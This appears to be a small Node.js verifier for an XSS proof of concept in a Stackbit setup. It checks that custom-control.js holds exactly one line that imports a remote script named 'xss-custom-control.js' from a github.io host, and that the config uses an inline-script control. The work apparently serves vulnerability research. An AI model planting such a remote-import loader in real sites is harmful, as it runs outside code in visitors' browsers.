const fs = require('fs');
const loader = fs.readFileSync('custom-control.js', 'utf8').trim();
const expected = "void import('https://lmzkjmiajzj-lgtm.github.io/tests/xss-custom-control.js');";
if (loader !== expected) throw new Error('custom-control loader is not the exact isolated import');
const config = fs.readFileSync('stackbit.config.ts', 'utf8');
if (!config.includes("controlType: 'custom-inline-script'")) throw new Error('custom-control source missing');
if (config.includes('assetSources:')) throw new Error('fixture is not isolated from asset-source path');
console.log(JSON.stringify({ proof: 'custom-control', loader: 'remote-import-only', isolated: true }));
